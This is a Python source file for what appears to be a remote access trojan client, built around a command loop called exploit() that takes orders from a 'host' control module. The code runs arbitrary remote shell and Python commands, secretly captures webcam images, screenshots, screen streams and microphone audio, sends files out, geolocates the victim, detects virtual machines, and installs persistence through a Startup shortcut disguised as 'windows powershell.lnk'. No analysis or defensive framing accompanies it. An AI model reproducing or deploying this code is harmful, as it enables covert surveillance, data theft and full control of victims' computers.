import subprocess
import os
import time
import cv2
import host
import tempfile
import sys
import io
from PIL import ImageGrab
import pyaudio
import wave
import keyboard
import requests


def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    output, error = process.communicate()

    if output:
        return output
    elif error:
        return error
    return None


def sendImage(cam):

    try:
        temp_dir = tempfile.gettempdir()
        image_path = os.path.join(temp_dir, 'webcam_image.jpg')
        cap = cv2.VideoCapture(cam)
        if not cap.isOpened():
            return f'Error: Camera could not be opened'

        ret, frame = cap.read()

        if ret:
            cv2.imwrite(image_path, frame)
            cap.release()
            return image_path

        else:
            cap.release()
            return f'Error: Image could not be captured'

    except Exception as e:
        return f'Error {str(e)}'


def sendScreenShot(command):
    try:
        screenshot = ImageGrab.grab()
        if command == 'ss':

            temp_dir = tempfile.gettempdir()
            ss_path = os.path.join(temp_dir, 'ss_image.jpg')

            screenshot.save(ss_path)
            return ss_path

        byte_io = io.BytesIO()
        screenshot.save(byte_io, 'JPEG')
        byte_data = byte_io.getvalue()
        return byte_data

    except Exception as e:
        return f'Error: {str(e)}'


def execute(code, type):

    if type == 'python':
        output_buffer = io.StringIO()
        original_stdout = sys.stdout
        sys.stdout = output_buffer
        try:
            exec(code)
        except Exception as ex:
            print(f"Error: {ex}")

        sys.stdout = original_stdout

        captured_output = output_buffer.getvalue()
        output_buffer.close()

        return captured_output

    else:
        return run_command(code)


def sendRecording(seconds):

    try:
        temp_dir = tempfile.gettempdir()
        recording_path = os.path.join(temp_dir, 'recording.wav')

        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 2
        fs = 44100

        p = pyaudio.PyAudio()

        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=fs,
                        frames_per_buffer=chunk,
                        input=True)

        frames = []

        for _ in range(0, int(fs / chunk * (seconds + 1))):
            data = stream.read(chunk)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with wave.open(recording_path, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(sample_format))
            wf.setframerate(fs)
            wf.writeframes(b''.join(frames))

        return recording_path

    except Exception as e:
        return f'Error: {str(e)}'


def checkMachine():
    try:
        o = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower()
        if 'virtual' in o or 'vmware' in o or 'vbox' in o:
            return 'Running on a virtual machine'

        return 'Running on a physical machine'

    except Exception as e:
        return str(e)


def ipaddr():
    try:
        ip = requests.get('https://api.ipify.org').text
        return f'Public IP: {ip}'

    except Exception as e:
        return str(e)


def location():
    try:
        ip = requests.get('https://api.ipify.org').text
        print(ip)
        response = requests.get(f'http://ip-api.com/json/{ip}')
        data = response.json()

        info = f"""
City: {data['city']}
Region: {data['regionName']}
Country: {data['country']}
Latitude: {data['lat']}, Longitude: {data['lon']}"""

        print(info)
        return info

    except Exception as e:
        return str(e)


def createStartup(temppath):
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

        shortcut_name = "windows powershell.lnk"

        shortcut_path = os.path.join(startup_folder, shortcut_name)

        vbs_content = f"""
        Set oWS = CreateObject("WScript.Shell")
        sLinkFile = "{shortcut_path}"
        Set oLink = oWS.CreateShortcut(sLinkFile)
        oLink.TargetPath = "{temppath}"
        oLink.Save
        """

        vbs_file = os.path.join(os.getenv('TEMP'), 'create_shortcut.vbs')

        with open(vbs_file, 'w') as file:
            file.write(vbs_content)

        os.system(f'cscript //nologo "{vbs_file}"')

        os.remove(vbs_file)

        return '\r[+] Successfully uploaded!'

    except Exception as e:
        return f'\r{e}'


def sendFile(path):
    try:
        s = open(path, 'r')
        content = s.read(1024).encode()
        encode = True

    except UnicodeDecodeError:
        s = open(path, 'rb')
        content = s.read(1024)
        encode = False

    except:
        return

    while content:
        host.sendImg(content)
        content = s.read(1024) if not encode else s.read(1024).encode()

    s.close()
    host.send('ENDOFFILE')


def exploit():

    while True:
        user_command, flag = host.process()
        if flag:

            if user_command[:7] == 'SCRIPY|' or user_command[:7] == 'FILE|||' or user_command[:7] == 'SCRIPB|':
                try:
                    scriptPath = user_command[7:]
                    if user_command[:7] == 'SCRIPY|' or user_command[:7] == 'SCRIPB|':
                        fileType = 'python' if user_command[:7] == 'SCRIPY|' else 'batch'
                        with open(scriptPath, 'r') as src:
                            result = execute(src.read(), fileType)
                            host.send(result)
                            time.sleep(0.2)
                            host.send('ENDOFFILE')

                            src.close()
                        if os.path.exists(scriptPath):
                            os.remove(scriptPath)

                    else:
                        host.send(createStartup(scriptPath))
                        time.sleep(0.2)
                        host.send('ENDOFFILE')

                except Exception as e:
                    host.send('Error: ' + str(e))

            else:

                if user_command.lower() == "exit":
                    host.send(user_command)
                    break

                elif user_command.lower() == 'machine':
                    host.send(checkMachine())

                elif user_command.lower() == 'ipaddr':
                    host.send(ipaddr())

                elif user_command.lower() == 'lctn':
                    host.send(location())

                elif user_command.lower()[:6] == 'filedl':
                    print('here')
                    path = user_command.lower()[6:]
                    sendFile(path)

                elif user_command.lower()[:2] == 'p|':
                    message = user_command[2:]
                    temp_dir = tempfile.gettempdir()
                    alert_path = os.path.join(temp_dir, 'alert.vbs')
                    with open(alert_path, 'w') as v:
                        code = f'lol=msgbox("{message}", 48, "Alert")'
                        v.write(code)

                    subprocess.run(['wscript', alert_path], shell=True)
                    if os.path.exists(alert_path):
                        os.remove(alert_path)

                elif user_command.lower() == 'suspend' or user_command.lower() == 'check':
                    host.send(user_command)

                elif user_command.lower().startswith('keytrigg'):
                    try:
                        keyboard.press_and_release(user_command.lower()[8:])
                    except Exception as e:
                        host.send(e)

                elif user_command.lower() == 'scrstream':
                    stopSignal, stopflag = host.process()

                    while stopSignal != 'stopstream':
                        stopSignal, stopflag = host.process()
                        imgdata = sendScreenShot('stopstream')

                        if imgdata:
                            chunk_size = 2048
                            total_sent = 0

                            while total_sent < len(imgdata) and stopSignal != 'stopstream':
                                chunk = imgdata[total_sent:total_sent + chunk_size]
                                host.sendImg(chunk)  # Send the current chunk
                                total_sent += len(chunk)

                            host.sendImg(b'ENDOFFILE')

                elif user_command.lower()[:5] == 'image' or user_command.lower() == 'ss' or user_command.lower()[:4] == 'recr':
                    path = sendImage(int(user_command.lower()[5])) if user_command.lower()[:5] == 'image' else sendScreenShot(user_command) if user_command.lower() == 'ss' else sendRecording(int(user_command[4:]))

                    if not path.startswith('Error'):
                        with open(path, 'rb') as data:
                            chunk = data.read(2048)  # Read a small chunk
                            while chunk:
                                host.sendImg(chunk)  # Send the chunk
                                chunk = data.read(2048)

                            host.sendImg(b'ENDOFFILE')
                            data.close()

                            if os.path.exists(path):
                                os.remove(path)

                    else:
                        host.send(path)

                elif user_command.lower() == 'rem.':
                    working_dir = os.getcwd()
                    host.send(f"{working_dir}>workingdir ")
                    time.sleep(0.2)
                    host.send('ENDOFFILE')

                elif user_command.startswith("cd"):

                    try:
                        path = user_command.split("cd", 1)[1].strip()
                        os.chdir(path)
                        working_dir = os.getcwd()
                        host.send(f"{working_dir}>workingdir")
                        time.sleep(0.2)
                        host.send('ENDOFFILE')
                    except Exception as e:
                        host.send(f"Error: {e}\n")
                        time.sleep(0.2)
                        host.send('ENDOFFILE')

                else:
                    output = run_command(user_command)
                    host.send(output)
                    time.sleep(0.2)
                    host.send('ENDOFFILE')

            host.process(False)


exploit()